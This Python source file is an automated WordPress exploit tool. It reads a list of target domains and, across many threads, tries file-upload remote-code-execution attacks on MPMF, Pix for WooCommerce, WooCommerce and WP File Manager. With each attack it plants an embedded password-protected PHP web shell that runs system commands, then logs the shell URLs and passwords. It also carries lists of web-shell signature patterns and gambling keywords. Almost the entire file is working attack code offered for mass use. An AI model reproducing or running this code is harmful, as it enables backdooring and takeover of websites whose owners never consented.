import requests
import re
import time
import os
import sys
import json
import random
import string
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import threading
import zipfile
import tempfile
import hashlib
from datetime import datetime

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
PINK = "\033[95m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JUDOL_KEYWORDS = [
    'slot', 'gacor', 'deposit', 'bonus', 'jackpot', 'rtp', 'pragmatic', 
    'pg soft', 'togel', 'casino', 'zeus', 'olympus', 'maxwin', 'scatter',
    'mahjong', 'ways', 'wild', 'bet', 'judi', 'bola', 'poker', 'situs'
]

SHELL_REGEX_PATTERNS = [
    r'uid=\d+\(.*\)',
    r'gid=\d+\(.*\)',
    r'Current Dir:',
    r'File Manager',
    r'Upload File',
    r'Execute Command',
    r'wso_ver',
    r'b374k',
    r'IndoXploit',
    r'WSO\s*[\d\.]+',
    r'Shell\s*v\d+',
    r'C99Shell',
    r'R57Shell',
    r'ALFA\s*TEaM',
    r'Leaf\s*Mailer',
    r'Mau\s*Upload\s*Apa',
    r'Uname:',
    r'multipart/form-data',
    r'type="file"',
    r'name="cmd"',
    r'eval\(base64_decode',
    r'FilesMan',
    r'WebShell',
    r'Mini\s*Shell',
    r'Priv8',
    r'Angel\s*Shell',
    r'g6\s*shell',
    r'h4x0r',
    r'input\s*name\s*=\s*["\']?cmd["\']?',
    r'input\s*name\s*=\s*["\']?pass["\']?',
    r'type\s*=\s*["\']?submit["\']?',
    r'value\s*=\s*["\']?execute["\']?',
    r'Symlink',
    r'Zone-H',
    r'linux',
    r'windows',
    r'drwxr',
    r'Safe_mode',
    r'Disable_functions',
    r'Open_basedir',
    r'php_uname',
    r'posix_getpwuid',
    r'disk_total_space'
]

SHELL_TITLE_REGEX = [
    r'WSO', r'Shell', r'b374k', r'IndoXploit', r'File Manager', r'Priv8', 
    r'Mini Shell', r'MadSpot', r'C99', r'R57', r'Remot', r'Hacked', 
    r'Defaced', r'Upload', r'Bypass', r'Root', r'Command', r'Backdoor',
    r'Mailer', r'0x', r'pwn', r'Admin', r'Dashboard'
]

# Reliable PHP Shell
SHELL_PASSWORD = "aezeron"
RELIABLE_SHELL = f"""<?php
$p = "{SHELL_PASSWORD}";
$auth = isset($_REQUEST['p']) && $_REQUEST['p'] === $p;
if($auth && isset($_REQUEST['cmd'])){{
    $cmd = $_REQUEST['cmd'];
    $output = '';
    if(function_exists('system')){{ ob_start(); system($cmd, $return); $output = ob_get_clean(); }}
    elseif(function_exists('exec')){{ exec($cmd, $out, $return); $output = implode("\\n", $out); }}
    elseif(function_exists('shell_exec')){{ $output = shell_exec($cmd); }}
    elseif(function_exists('passthru')){{ ob_start(); passthru($cmd); $output = ob_get_clean(); }}
    echo $output;
    die;
}}
if($auth && isset($_FILES['f'])){{
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    die;
}}
echo "Shell ready";
?>"""

SIMPLE_SHELL = f"""<?php
$p = "{SHELL_PASSWORD}";
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p && isset($_REQUEST['cmd'])){{
    echo shell_exec($_REQUEST['cmd']);
    die;
}}
if(isset($_REQUEST['p']) && $_REQUEST['p']===$p && isset($_FILES['f'])){{
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    die;
}}
echo "Shell ready";
?>"""

class WPExploitScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.results = []
        self.start_time = datetime.now()

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "SUCCESS":
            print(f"{GREEN}[{timestamp}][+]{RESET} {message}")
        elif level == "ERROR":
            print(f"{RED}[{timestamp}][-]{RESET} {message}")
        elif level == "EXPLOIT":
            print(f"{MAGENTA}[{timestamp}][!]{RESET} {message}")
        else:
            print(f"{CYAN}[{timestamp}][*]{RESET} {message}")

    def verify_shell(self, url):
        try:
            test_url = f"{url}?p={SHELL_PASSWORD}&cmd=echo%20OK"
            resp = self.session.get(test_url, timeout=10)
            if resp.status_code == 200 and ("OK" in resp.text or "Shell ready" in resp.text):
                return True
        except:
            pass
        return False

    def detect_mpmf_endpoint(self, target_url):
        """Enhanced MPMF endpoint detection"""
        base_url = target_url.rstrip('/')
        
        endpoint_patterns = [
            f"{base_url}/mpmf-1/",
            f"{base_url}/mpmf/",
            f"{base_url}/multi-purpose-multi-forms/mpmf-1/",
            f"{base_url}/wp-content/plugins/multi-purpose-multi-forms/mpmf-1/",
            f"{base_url}/index.php/mpmf-1/",
            f"{base_url}/wp-content/uploads/mpmf_uploads/",
        ]
        
        for endpoint in endpoint_patterns:
            try:
                resp = self.session.get(endpoint, timeout=5)
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if any(x in content for x in ['mpmf', 'form_name', 'mpmf_form_id', 'custom_form_action']):
                        return endpoint
            except:
                continue
        
        # Try to find from main page
        try:
            resp = self.session.get(base_url, timeout=5)
            if resp.status_code == 200:
                form_actions = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                for action in form_actions:
                    if 'mpmf' in action.lower() or 'form' in action.lower():
                        full_url = urljoin(base_url, action)
                        return full_url
        except:
            pass
        
        return None

    def detect_form_name(self, endpoint_url):
        """Detect form name from endpoint"""
        if not endpoint_url:
            return 'hkh'  # default common form name
        
        try:
            resp = self.session.get(endpoint_url, timeout=5)
            if resp.status_code == 200:
                # Look for form_name in hidden inputs
                hidden_matches = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']form_name["\'][^>]+value=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                if hidden_matches:
                    return hidden_matches[0]
                
                # Look for form_name in JavaScript
                js_matches = re.findall(r'form_name["\']?\s*:\s*["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                if js_matches:
                    return js_matches[0]
        except:
            pass
        
        # Common form names to try
        common_names = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default']
        for name in common_names:
            try:
                test_url = f"{endpoint_url}?form_name={name}"
                resp = self.session.get(test_url, timeout=3)
                if resp.status_code == 200 and len(resp.text) > 100:
                    return name
            except:
                continue
        
        return 'hkh'

    def exploit_mpmf_rce(self, target_url):
        """Exploit MPMF RCE"""
        self.log(f"Testing MPMF RCE on {target_url}", "INFO")
        
        endpoint = self.detect_mpmf_endpoint(target_url)
        if not endpoint:
            self.log("MPMF endpoint not found", "ERROR")
            return None
        
        form_name = self.detect_form_name(endpoint)
        self.log(f"Found endpoint: {endpoint}", "INFO")
        self.log(f"Using form name: {form_name}", "INFO")
        
        shell_hash = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        shell_name = f"sh_{shell_hash}.php"
        
        # Determine base URL
        if '/wp-content/' in endpoint:
            base_url = endpoint.split('/wp-content/')[0] + '/'
        else:
            base_url = target_url.rstrip('/') + '/'
        
        files = {
            "file1": (shell_name, SIMPLE_SHELL, "application/x-php")
        }
        
        data = {
            "form_name": form_name,
            "field_label1": "",
            "countcalculated": "1",
            "count_files": "1",
            "count": "2",
            "mpmf_form_id": "1",
            "custom_form_action": "send_data",
            "send": "Submit",
        }
        
        try:
            response = self.session.post(endpoint, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                # Check possible shell locations
                possible_paths = [
                    f"{base_url}wp-content/uploads/mpmf_uploads/{shell_name}",
                    f"{base_url}wp-content/uploads/{shell_name}",
                    f"{base_url}{shell_name}",
                ]
                
                for path in possible_paths:
                    if self.verify_shell(path):
                        self.log(f"MPMF Shell uploaded: {path}?p={SHELL_PASSWORD}", "SUCCESS")
                        return f"{path}?p={SHELL_PASSWORD}"
        except Exception as e:
            self.log(f"MPMF exploit error: {str(e)}", "ERROR")
        
        return None

    def exploit_pix_rce(self, target_url):
        """Exploit Pix for WooCommerce RCE"""
        self.log(f"Testing Pix RCE on {target_url}", "INFO")
        
        base_url = target_url.rstrip("/")
        shell_hash = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        shell_name = f"pix_{shell_hash}.php"
        
        # Try to get nonce
        nonce = None
        nonce_actions = [
            "lkn_pix_for_woocommerce_generate_nonce",
            "pix_generate_nonce",
            "woocommerce_pix_nonce",
        ]
        
        for action in nonce_actions:
            try:
                resp = self.session.post(
                    f"{base_url}/wp-admin/admin-ajax.php",
                    data={"action": action, "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce"},
                    timeout=10
                )
                if resp.status_code == 200 and resp.text:
                    try:
                        data = resp.json()
                        nonce = data.get("data", {}).get("nonce") or data.get("nonce")
                        if nonce:
                            break
                    except:
                        match = re.search(r'"nonce":"([^"]+)"', resp.text)
                        if match:
                            nonce = match.group(1)
                            break
            except:
                continue
        
        if not nonce:
            nonce = "pix_nonce_2024"
        
        # Try to upload shell
        file_fields = ["certificate_crt_path", "file", "upload_file"]
        
        for file_field in file_fields:
            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
                tmp.write(SIMPLE_SHELL.encode())
                tmp_path = tmp.name
            
            try:
                data = {
                    "action": "lkn_pix_for_woocommerce_c6_save_settings",
                    "_ajax_nonce": nonce,
                    "settings": json.dumps({"enabled": "yes", "title": "PIX C6", "pix_expiration_minutes": 30}),
                }
                
                with open(tmp_path, "rb") as f:
                    files = {file_field: (shell_name, f, "application/x-php")}
                    upload_response = self.session.post(
                        f"{base_url}/wp-admin/admin-ajax.php",
                        data=data,
                        files=files,
                        timeout=30
                    )
                
                if upload_response.status_code == 200:
                    # Check possible shell locations
                    possible_paths = [
                        f"{base_url}/wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/{shell_name}",
                        f"{base_url}/wp-content/uploads/{shell_name}",
                        f"{base_url}/{shell_name}",
                    ]
                    
                    for path in possible_paths:
                        if self.verify_shell(path):
                            self.log(f"Pix Shell uploaded: {path}?p={SHELL_PASSWORD}", "SUCCESS")
                            return f"{path}?p={SHELL_PASSWORD}"
                            
            finally:
                os.unlink(tmp_path)
        
        return None

    def exploit_woocommerce_rce(self, target_url):
        """Exploit WooCommerce RCE"""
        self.log(f"Testing WooCommerce RCE on {target_url}", "INFO")
        
        base_url = target_url.rstrip("/")
        shell_hash = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
        shell_name = f"woo_{shell_hash}.php"
        
        files = {
            "file": (shell_name, SIMPLE_SHELL, "image/jpeg"),
        }
        
        data = {
            "action": "wc_upload_file_ajax",
        }
        
        try:
            response = self.session.post(
                f"{base_url}/wp-admin/admin-ajax.php",
                files=files,
                data=data,
                timeout=30
            )
            
            if response.status_code == 200:
                # Extract URL from response
                url_match = re.search(r'(https?://[^\s"\'<>]+\.php)', response.text)
                if url_match:
                    shell_url = url_match.group(1)
                    if self.verify_shell(shell_url):
                        self.log(f"WooCommerce Shell uploaded: {shell_url}?p={SHELL_PASSWORD}", "SUCCESS")
                        return f"{shell_url}?p={SHELL_PASSWORD}"
        except Exception as e:
            self.log(f"WooCommerce exploit error: {str(e)}", "ERROR")
        
        return None

    def exploit_file_manager_rce(self, target_url):
        """Exploit WP File Manager RCE"""
        self.log(f"Testing WP File Manager RCE on {target_url}", "INFO")
        
        base_url = target_url.rstrip("/")
        endpoint = f"{base_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        
        try:
            # Check if vulnerable
            check = self.session.get(endpoint, timeout=5)
            if check.status_code != 200:
                return None
            
            try:
                json_data = check.json()
                if 'error' not in json_data or 'errUnknownCmd' not in str(json_data['error']):
                    return None
            except:
                return None
            
            shell_hash = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
            shell_name = f"fm_{shell_hash}.php"
            
            with tempfile.NamedTemporaryFile(suffix=".php", delete=False) as tmp:
                tmp.write(SIMPLE_SHELL.encode())
                tmp_path = tmp.name
            
            try:
                files = {'upload[]': (shell_name, open(tmp_path, 'rb'), 'application/x-php')}
                data = {
                    'reqid': '17457a1fe6959',
                    'cmd': 'upload',
                    'target': 'l1_Lw',
                    'mtime[]': '1576045135'
                }
                
                response = self.session.post(endpoint, files=files, data=data, timeout=30)
                
                if response.status_code == 200:
                    # Check possible locations
                    possible_paths = [
                        f"{base_url}/wp-content/plugins/wp-file-manager/lib/files/{shell_name}",
                        f"{base_url}/wp-content/uploads/{shell_name}",
                        f"{base_url}/{shell_name}",
                    ]
                    
                    for path in possible_paths:
                        if self.verify_shell(path):
                            self.log(f"File Manager Shell uploaded: {path}?p={SHELL_PASSWORD}", "SUCCESS")
                            return f"{path}?p={SHELL_PASSWORD}"
                            
            finally:
                os.unlink(tmp_path)
                
        except Exception as e:
            self.log(f"File Manager exploit error: {str(e)}", "ERROR")
        
        return None

    def scan_target(self, target_url):
        """Scan a single target with all exploits"""
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        
        result = {
            'url': target_url,
            'timestamp': datetime.now().isoformat(),
            'shells': [],
            'success': False
        }
        
        self.log(f"Scanning {target_url}", "INFO")
        
        # Try all exploits in order
        exploits = [
            ("MPMF RCE", self.exploit_mpmf_rce),
            ("Pix for WooCommerce RCE", self.exploit_pix_rce),
            ("WooCommerce RCE", self.exploit_woocommerce_rce),
            ("WP File Manager RCE", self.exploit_file_manager_rce),
        ]
        
        for exploit_name, exploit_func in exploits:
            shell_url = exploit_func(target_url)
            if shell_url:
                result['shells'].append({
                    'exploit': exploit_name,
                    'url': shell_url,
                    'password': SHELL_PASSWORD
                })
                result['success'] = True
                self.log(f"Success! {exploit_name} gave shell: {shell_url}", "EXPLOIT")
                break  # Stop after first successful exploit
        
        if not result['success']:
            self.log(f"No working exploits found for {target_url}", "ERROR")
        
        return result

    def scan_targets(self, targets, max_workers=10):
        """Scan multiple targets in parallel"""
        results = []
        total = len(targets)
        completed = 0
        
        self.log(f"Starting scan of {total} targets with {max_workers} threads", "INFO")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {executor.submit(self.scan_target, target): target for target in targets}
            
            for future in as_completed(future_to_target):
                completed += 1
                try:
                    result = future.result(timeout=60)
                    results.append(result)
                    self.log(f"Progress: {completed}/{total} ({int(completed/total*100)}%)", "INFO")
                except Exception as e:
                    self.log(f"Scan failed: {str(e)}", "ERROR")
                    results.append({'url': future_to_target[future], 'error': str(e), 'success': False})
        
        return results

    def save_results(self, results, filename=None):
        """Save results to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"wp_exploit_results_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("WORDPRESS EXPLOIT SCANNER RESULTS\n")
            f.write(f"Scan started: {self.start_time.isoformat()}\n")
            f.write(f"Scan completed: {datetime.now().isoformat()}\n")
            f.write("=" * 80 + "\n\n")
            
            successful = [r for r in results if r.get('success')]
            failed = [r for r in results if not r.get('success')]
            
            f.write(f"SUMMARY:\n")
            f.write(f"- Total targets: {len(results)}\n")
            f.write(f"- Successful exploits: {len(successful)}\n")
            f.write(f"- Failed: {len(failed)}\n\n")
            
            if successful:
                f.write("=" * 80 + "\n")
                f.write("SUCCESSFUL EXPLOITS\n")
                f.write("=" * 80 + "\n\n")
                
                for result in successful:
                    f.write(f"Target: {result['url']}\n")
                    for shell in result['shells']:
                        f.write(f"  Exploit: {shell['exploit']}\n")
                        f.write(f"  Shell URL: {shell['url']}\n")
                        f.write(f"  Password: {shell['password']}\n")
                    f.write("\n" + "-" * 40 + "\n\n")
            
            if failed:
                f.write("=" * 80 + "\n")
                f.write("FAILED TARGETS\n")
                f.write("=" * 80 + "\n\n")
                for result in failed:
                    f.write(f"Target: {result['url']}\n")
                    if 'error' in result:
                        f.write(f"Error: {result['error']}\n")
                    f.write("\n")
        
        print(f"\n{GREEN}[+]{RESET} Results saved to: {filename}")
        return filename

def banner():
    banner_text = f"""
{PINK}{BOLD}
  _____   _____   ___ __ ___  __    ___ ___  ___  _ 
 / __\\ \\ / / __|_|_  )  \\_  )/ / __|_  ) _ \\/ _ \\/ |
 | (__\\ V /| _|___/ / () / // _ \\___/ /\\_, /\\_, /| |
 \\___| \\_/ |___| /___\\__/___\\___/  /___|/_/  /_/ |_|
{RESET}
  {PINK}{BOLD}AUTOMATED WORDPRESS EXPLOIT SCANNER{RESET}
  {CYAN}Exploits: MPMF RCE | Pix for WooCommerce RCE | WooCommerce RCE | WP File Manager RCE{RESET}
  {YELLOW}Fully automated - No manual input required{RESET}
"""
    print(banner_text)

def load_targets(filename):
    """Load targets from file"""
    targets = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if '://' not in line:
                        line = 'http://' + line
                    targets.append(line)
    except Exception as e:
        print(f"{RED}[!]{RESET} Error loading file: {e}")
        return []
    return targets

def main():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    
    banner()
    
    # Get targets file
    filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
    
    if not os.path.exists(filename):
        print(f"{RED}[!]{RESET} File not found: {filename}")
        return
    
    targets = load_targets(filename)
    
    if not targets:
        print(f"{RED}[!]{RESET} No targets loaded")
        return
    
    print(f"{GREEN}[+]{RESET} Loaded {CYAN}{len(targets)}{RESET} targets")
    
    # Get thread count
    threads_input = input(f"{YELLOW}[?]{RESET} Threads (default 10): ").strip()
    max_workers = int(threads_input) if threads_input.isdigit() else 10
    max_workers = min(max_workers, 30)
    
    print(f"\n{BLUE}[*]{RESET} Starting automated scan with {CYAN}{max_workers}{RESET} threads...")
    print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop\n")
    
    try:
        scanner = WPExploitScanner()
        results = scanner.scan_targets(targets, max_workers)
        
        # Save results
        save_file = scanner.save_results(results)
        
        # Print final summary
        print(f"\n{BLUE}{'='*60}{RESET}")
        print(f"{GREEN}[+]{RESET} SCAN COMPLETE")
        print(f"{BLUE}{'='*60}{RESET}")
        
        successful = [r for r in results if r.get('success')]
        print(f"{GREEN}[+]{RESET} Successful exploits: {len(successful)}/{len(results)}")
        
        for result in successful:
            print(f"\n  {MAGENTA}[!]{RESET} {result['url']}")
            for shell in result['shells']:
                print(f"    {GREEN}→{RESET} {shell['url']}")
                print(f"    {YELLOW}Password:{RESET} {shell['password']}")
        
        print(f"\n{CYAN}[*]{RESET} Results saved to: {save_file}")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!]{RESET} Scan interrupted by user")
    except Exception as e:
        print(f"{RED}[!]{RESET} Scan error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{RESET}")
    except Exception as e:
        print(f"{RED}Fatal error: {e}{RESET}")
